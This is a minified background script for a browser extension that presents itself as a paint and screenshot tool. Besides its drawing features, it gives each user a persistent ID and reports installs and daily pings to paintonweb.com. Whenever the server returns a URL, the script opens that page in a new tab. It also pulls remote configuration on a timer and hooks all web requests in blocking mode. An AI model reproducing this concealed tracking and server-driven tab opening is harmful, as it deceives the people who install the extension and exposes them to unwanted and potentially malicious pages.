var global="undefined"!=typeof chrome?chrome:"undefined"!=typeof browser?browser:void 0;NP={actionUrl:"http://paintonweb.com/api/action/",uninstallUrl:"http://paintonweb.com/uninstall/",configUrl:"http://paintonweb.com/api/config/",config:{},queue:[],queueProcessorReady:!1,uid:"",version:chrome.runtime.getManifest().version,IsShortCutsShow:!0,IsAppsShow:!0,init:function(){global.tabs.onUpdated.addListener((function(e,t,n){n.url||n.pendingUrl})),global.browserAction.onClicked.addListener(this.inject),global.runtime.onMessage.addListener((function(e,t,n){if("take_screen_shot"===e.method)NP.screenShot(n);else if("get_pixel_color"===e.method){var o=e.point;NP.getPixelColor(o,n)}else{if("getConfig"===e.method)return!0;"save_data"===e.method?NP.saveData(e.config):"get_data"===e.method?NP.getData(n):"open_options"===e.method&&chrome.runtime.openOptionsPage()}return!0})),NP.initWebrequests(),NP.initStorage(),NP.initListeners()},getPixelColor:function(e,t){global.tabs.captureVisibleTab(null,null,(function(n){var o=document.createElement("canvas"),i=o.getContext("2d"),r=new Image;document.documentElement.appendChild(o),r.src=n,r.onload=function(){o.width=r.naturalWidth,o.height=r.naturalHeight,i.drawImage(r,0,0);var n=i.getImageData(0,0,o.width,o.height),a=4*(e.y*n.width+e.x),s=n.data;if("function"==typeof t){var c={r:s[a],g:s[a+1],b:s[a+2],a:s[a+3]};document.documentElement.removeChild(o),t(c)}}}))},saveData:function(e){try{localStorage.setItem("config",JSON.stringify(e))}catch(e){}},getData:function(e){var t=localStorage.getItem("config"),n=null;try{n=JSON.parse(t)}catch(e){}e(n)},initWebrequests:function(){global.webRequest.onHeadersReceived.addListener((({responseHeaders:e})=>{let t=[];return e.forEach((e=>{t.push(e)})),{responseHeaders:t}}),{urls:["*://*/*"]},["blocking","responseHeaders"])},inject:function(){chrome.tabs.query({active:!0,currentWindow:!0},(function(e){e[0].url.includes("newtab")?chrome.tabs.sendMessage(e[0].id,{type:"openPanel"},(function(e){})):global.tabs.insertCSS(null,{file:"/css/main.min.css"},(function(){if(global.extension.lastError){global.extension.lastError.message;try{alert("We are sorry, but the page you are viewing is not supported. Please try another page.")}catch(e){}}global.tabs.executeScript(null,{file:"/js/inject.js"})}))}))},screenShot:function(e){global.tabs.captureVisibleTab((function(t){var n=global.extension.getURL("screen.html");global.tabs.query({},(function(o){var i;if(o&&o.length)for(var r=o.length-1;0<=r;r--)if(o[r].url===n){i=o[r];break}i?global.tabs.update(i.id,{active:!0},Function.prototype.bind.call(NP.updateScreenshot,NP,t,e,0)):global.tabs.create({url:n},(n=>{chrome.tabs.onUpdated.addListener((function o(i,r){i==n.id&&"complete"==r.status&&(chrome.tabs.onUpdated.removeListener(o),NP.updateScreenshot(t,e,0,n))}))}))}))}))},updateScreenshot:function(e,t){var n=arguments[2];null==n&&(n=0),10<n||global.runtime.sendMessage({method:"update_url",url:e},(function(o){o&&o.success||window.setTimeout(Function.prototype.bind.call(NP.updateScreenshot,NP,e,t,++n),300)}))},initPinger(){NP.queue.push({type:"action",action:"ping"}),NP.processQueue(),setTimeout(NP.initPinger,864e5)},processQueue:function(){for(;NP.queue.length>0;){var e=NP.queue.shift();if(!e.type||"action"!=e.type)return!0;var t="p="+encodeURIComponent(btoa(JSON.stringify({id:chrome.runtime.id,v:NP.version,action:e.action,uid:NP.uid,t:Date.now()})));fetch(NP.actionUrl+"?"+t).then((e=>e.json())).then((function(e){e.url&&chrome.tabs.create({url:e.url})}))}},setUninstallUrl:function(){var e="p="+encodeURIComponent(btoa(JSON.stringify({id:chrome.runtime.id,v:NP.version,action:"uninstall",uid:NP.uid,t:Date.now()})));chrome.runtime.setUninstallURL(NP.uninstallUrl+"?"+e)},initListeners:function(){chrome.runtime.onInstalled.addListener((e=>{NP.queue.push({type:"action",action:e.reason}),NP.queueProcessorReady&&NP.processQueue()}))},getConfig:function(e){return fetch(NP.configUrl).then((e=>e.json())).then((function(t){return e(t)}))},initStorage:function(){chrome.storage.local.get((e=>{e&&e.config&&(NP.config=e.config),NP.config.uid?NP.uid=NP.config.uid:(NP.uid=NP.config.uid=NP.generateUID(),this.saveConfig()),e.IsShortCutsShow||chrome.storage.local.set({IsShortCutsShow:!0}),e.IsAppsShow||chrome.storage.local.set({IsAppsShow:!0}),NP.queueProcessorReady=!0,NP.setUninstallUrl(),NP.processQueue(),NP.initPinger(),NP.updateConfig()}))},updateConfig(){let e=this;fetch(NP.configUrl,{method:"POST",headers:{"Content-Type":"application/x-www-form-urlencoded"},body:"filters="+encodeURIComponent(btoa(JSON.stringify({id:chrome.runtime.id,version:this.version,timestamp:Date.now(),uid:this.config.uid})))}).then((e=>e.json())).then((e=>{if(e){for(let t in e)this.config[t]=e[t];this.saveConfig(this.config)}})).finally((()=>{this.config.configUpTime&&this.config.configUpTime>0&&setTimeout((function(){e.updateConfig()}),this.config.configUpTime)}))},saveConfig(){chrome.storage.local.set({config:NP.config})},generateUID:()=>"xxxxxxxx-xxxx-2xxx-yxxx-xxxxxxxxxxxx".replace(/[xy]/g,(function(e){var t=16*Math.random()|0;return("x"==e?t:3&t|8).toString(16)}))},NP.init();